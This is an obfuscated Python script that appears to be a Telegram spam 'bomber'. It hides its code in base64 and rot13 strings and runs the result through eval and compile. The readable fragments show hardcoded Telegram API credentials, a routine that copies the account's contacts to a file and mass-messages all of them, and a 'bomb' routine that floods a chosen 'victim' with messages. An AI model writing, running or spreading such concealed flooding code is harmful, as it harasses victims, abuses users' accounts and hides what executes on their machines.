
# Coded by Cracker
# CRACKER911181
 

import base64, codecs
magic = 'ZnJvbSB0ZWxldGhvbi5zeW5jIGltcG9ydCBUZWxlZ3JhbUNsaWVudCwgZXZlbnRzCmZyb20gdGVsZXRob24uc3luYyBpbXBvcnQgVGVsZWdyYW1DbGllbnQKZnJvbSB0ZWxldGhvbiBpbXBvcnQgZnVuY3Rpb25zLCB0eXBlcwpmcm9tIHRlbGVncmFtLmV4dCBpbXBvcnQgVXBkYXRlcixDb21tYW5kSGFuZGxlciAKaW1wb3J0IG9zLHN5cyx0aW1lCmltcG9ydCByYW5kb20KCgoKCgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgoKCgpkZWYgYWxsc21zKCk6CglwcmludChyb3N5KyJcblsrXSBMb2dpbiBZb3VyIFRlbGVncmFtIEFjY291bnRcbiIpCgl3aXRoIFRlbGVncmFtQ2xpZW50KCJuYW1lIiwgNzYwOTg1LCAiMzBkNzM0YWI5YTJjMjcxMmIwZmNmOTUzOTM2ZDVhODgiKSBhcyBjbGllbnQ6CgkgICAgcmVzdWx0ID0gY2xpZW50KGZ1bmN0aW9ucy5jb250YWN0cy5HZXRDb250YWN0c1JlcXVlc3QoCgkgICAgICAgIGhhc2g9MAoJICAgICkpCgkgICAgeD1zdHIocmVzdWx0LnN0cmluZ2lmeSgpKQoJIyAgICBwcmludCh4KQoJICAgIG9vPW9wZW4oImNvbnRhY3QudHh0IiwidyIpCgkgICAgb28ud3JpdGUoeCkKCSAgICBvby5jbG9zZSgpCgl0ZXh0PXN0cihpbnB1dChyb3N5KyJcblxuRW50ZXIgWW91ciBNZXNzYWdlOiAiKSkKCW9vPW9wZW4oImNvbnRhY3QudHh0IiwiciIpCglvPW9vLnJlYWQoKQoJdD1zdHIobykKCXR0PXQuZmluZCgiWyIpCgl0dHQ9dC5maW5kKCJdIikKCXY9KHRbdHQ6dHR0XSkKCXNwPXYuc3BsaXQoIlxuIikKCWZvciB4IGluIHNwOgoJCWs9eC5maW5kKCJ1c2VyX2lkPSIpCgkJZz14LmZpbmQoIiwiKQoJCWI9KHhbazpnXSkKCQlrPShiWzg6MThdKQoJCWlmIGs9PSIiOgoJCQljb250aW51ZQoJCWVsc2U6CgkJCWQ9KGludChrKSkKCQkJd2l0aCBUZWxlZ3JhbUNsaWVudCgnbmFtZScsIDc2MDk4NTIsICIzMGQ3MzRhYjlhMmMyNzEyYjBmY2Y5NTM5MzZkNWE4OCIpIGFzIGNsaWVudDoKCQkJCWNsaWVudC5zZW5kX21lc3NhZ2UoZCwgdGV4dCkKCQkJCXByaW50KHJlZCsiXHRNZXNzYWdlIFRvIixkKQoJCglwcmludChncmVlbisiXG5cblx0XHREb25lIikKCXRpbWUuc2xlZXAoNykKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmRlZiBib21iKCk6CglwcmludChyb3N5KyJcblsrXSBMb2dpbiBZb3VyIFRlbGVncmFtIEFjY291bnRcbiIpCgl3aXRoIFRlbGVncmFtQ2xpZW50KCJuYW1lIiw3NjA5ODUyLCIzMGQ3MzRhYjlhMmMyNzEyYjBmY2Y5NTM5MzZkNWE4OCIpIGFzIGNsaWVudDoKCQl2aWM9c3RyKGlucHV0KHJvc3krIlxuRW50ZXIgWW91ciBWaWN0aW06ICIrcmVkKSkKCQlhbW50PWludChpbnB1dChyb3N5KyJFbnRlciBTZW5kaW5nIEFtb3VudDogIityZWQpKQoJC'
love = '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'
god = 'RleHQpOgoJCXRyeToKCQkJY29udGV4dC5ib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQ9dXBkYXRlLmVmZmVjdGl2ZV9jaGF0LmlkLHRleHQ9dHh0MSkKCQlleGNlcHQ6CgkJCWNvbnRleHQuYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkPXVwZGF0ZS5lZmZlY3RpdmVfY2hhdC5pZCx0ZXh0PXR4dDEpCgkKCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQoJZGVmIHRleHQyKHVwZGF0ZSwgY29udGV4dCk6CgkJdHJ5OgoJCQljb250ZXh0LmJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD11cGRhdGUuZWZmZWN0aXZlX2NoYXQuaWQsdGV4dD10eHQyKQoJCWV4Y2VwdDoKCQkJY29udGV4dC5ib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQ9dXBkYXRlLmVmZmVjdGl2ZV9jaGF0LmlkLHRleHQ9dHh0MikKCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkKCWRlZiB0ZXh0Myh1cGRhdGUsIGNvbnRleHQpOgoJCXRyeToKCQkJY29udGV4dC5ib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQ9dXBkYXRlLmVmZmVjdGl2ZV9jaGF0LmlkLHRleHQ9dHh0MykKCQlleGNlcHQ6CgkJCWNvbnRleHQuYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkPXVwZGF0ZS5lZmZlY3RpdmVfY2hhdC5pZCx0ZXh0PXR4dDMpCgkKCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQoJZGVmIHRleHQ0KHVwZGF0ZSwgY29udGV4dCk6CgkJdHJ5OgoJCQljb250ZXh0LmJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD11cGRhdGUuZWZmZWN0aXZlX2NoYXQuaWQsdGV4dD10eHQ0KQoJCWV4Y2VwdDoKCQkJY29udGV4dC5ib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQ9dXBkYXRlLmVmZmVjdGl2ZV9jaGF0LmlkLHRleHQ9dHh0NCkKCQoJCgkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkKCQoJZGVmIHRleHQ1KHVwZGF0ZSwgY29udGV4dCk6CgkJdHJ5OgoJCQljb250ZXh0LmJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD11cGRhdGUuZWZmZWN0aXZlX2NoYXQuaWQsdGV4dD10eHQ1KQoJCWV4Y2VwdDoKCQkJY29udGV4dC5ib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQ9dXBkYXRlLmVmZmVjdGl2ZV9jaGF0LmlkLHRleHQ9dHh0NSkKCQoJCgkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQoJZGVmIHN0YXJ0KHVwZGF0ZSwgY29udGV4dCk6CgkJdHJ5OgoJCQljb250ZXh0LmJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD11cGRhdGUuZWZmZWN0aXZlX2NoYXQuaWQsdGV4dD0nSGV5ISBXZWxjb21l8J+kqSAgICcpCgkJZXhjZXB0OgoJCQljb250ZXh0LmJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD11cGRhdGUuZWZmZWN0aXZlX2NoYXQuaWQsdGV4dD0nSGV5ISBXZWxjb21l8J+kqSAgICcpCgkKCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQoJZGVmIHN0b3AodXBkYXRlLCBjb250ZXh0KToKCQl0cnk6CgkJCWNvbnRleHQuYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkPXVwZGF0ZS5lZmZlY3RpdmVfY2hhdC5pZCx0ZXh0PSdHb29kIEJ5ZfCfmLQgICAnKQoJCWV4Y2VwdDoKCQkJY29udGV4dC5ib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQ9dXBkYXRlLmVmZmVjdGl2ZV9jaGF0LmlkLHRleHQ'
destiny = '9Vxqio2DtDayy8W+LgPNtVPVcPtxXPDbWVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZXPDbWPtyxMJLtoJScovtcBtbWPKIjMTS0MKVtCFOIpTEuqTIlXUEin2IhXDbWPDbWPJEjVQ0tqKOxLKEypv5xnKAjLKEwnTIlPtxWPtxWPtxWVlZwVlZwVjbWPDbWPJEjYzSxMS9bLJ5xoTIlXRAioJ1uozEVLJ5xoTIlXPqmqTSlqPpfp3EupaDcXDbWPDbWPJEjYzSxMS9bLJ5xoTIlXRAioJ1uozEVLJ5xoTIlXPqmqT9jWlkmqT9jXFxXPDxXPDyxpP5uMTEsnTShMTkypvuQo21gLJ5xFTShMTkypvuwoJDkYUEyrUDkXFxXPDxXPDyxpP5uMTEsnTShMTkypvuQo21gLJ5xFTShMTkypvuwoJDlYUEyrUDlXFxXPDxXPDyxpP5uMTEsnTShMTkypvuQo21gLJ5xFTShMTkypvuwoJDmYUEyrUDmXFxXPDxXPDyxpP5uMTEsnTShMTkypvuQo21gLJ5xFTShMTkypvuwoJD0YUEyrUD0XFxXPDxXPDyxpP5uMTEsnTShMTkypvuQo21gLJ5xFTShMTkypvuwoJD1YUEyrUD1XFxXPDxXPDyjpzyhqPuapzIyovfvKT5poyk0KUEGqTSlqTIxVvxXPDxwVlZwVlZwVjbWPDbWPKIjMTS0MKVhp3EupaEspT9foTyhMltcPtxWPtxWqKOxLKEypv5cMTkyXPxXPDbWqUW5BtbWPJ1unJ4bXDbWMKuwMKO0BtbWPJ1unJ4bXDbXPaqbnJkyVSElqJH6Ptyipl5mrKA0MJ0bW2AfMJSlWlxXPKOlnJ50XTWfqJHeMvVvVtbtVPOsK19sVPNtVPNtVPNtVPNtVPNtVS8tVPNtVPNtVPNtVPNtVPNtK19sK18tVPNtVPNtVPNtVS8XVPNiVS9sK3ksVS9sVS9sVS8tVS9sK3jtsPOsK19sKlOsVS9sVPNtsS8tVPOssS9sVPNtK19sVUjtsNbtVvVvX2WfqJHeVvVvsPO8VPNtsPNaK18iVS9tVUjiVS9ssPO8YlNiVS8tKPNaK198K19sK3jtsP8tKlOpVP8tKlOpsPO8PvNvVvVepTImqPfvVvW8VUksK198VUjtsPNbK3jtsPNbK198VPNtCPNtK18iVUjtsS9sK19ssPO8VPusXFO8VPusXFO8VUjXVPOpK19sK3kssPNtKS9sYS98KS9sK3kssSksKS9sK3kssPNtVPNtVPO8K3kpK19sYlOpK19sY3kssSkhKT4tVvVvX2qlMJIhXlVvVvNtVPNtVPNtVPNtVPOQpzSwnlOMo3IlVSqipzkxYPOWMvOMo3HtD2ShKT5poyk0VPNtVPNtVPNtVvVvX2WfqJHeVvVvJ+XLuI0tITIfMJqlLJ0tF2y0VSivzVIqVSkhVvVvX2qlMJIhXlVvVvN9CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG0vVvVeL29fo3Ilo2MzXDbWL2uip2H9p3ElXTyhpUI0XUOyp3DeVykhKT5pqSk0ZF5HMJkyM3WuoFOPo21vnJ5aKT5pqSk0Zv5OoTjtITIfMJqlLJ0tD29hqTSwqPOGoKZtH2IhMSkhKUEpqQZhDz90VRAioJ1uozDtE2IhLKWyqT9lKT5pqSk0VvglMJDeVwNjYxWuL2ftIT8tFT9gMIkhKT4vX3Wip3xeVxIhqTIlVSyiqKVtG3O0nJ9hBvNvXFxXPDbWnJLtL2uip2H9CFVkVwbXPDy0pax6PtxWPJWioJVbXDbWPJI4L2IjqQbXPDxWpTSmpjbWMJkcMvOwnT9mMG09VwVvBtbWPKElrGbXPDxWLJkfp21mXPxXPDyyrTAypUD6PtxWPKOup3ZXPJIfnJLtL2uip2H9CFVmVwbXPDy0pax6PtxWPJWiqPtcPtxWMKuwMKO0BtbWPDyjLKAmPtyyoTyzVTAbo3AyCG0vZQNvBtbWPJWlMJSe'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
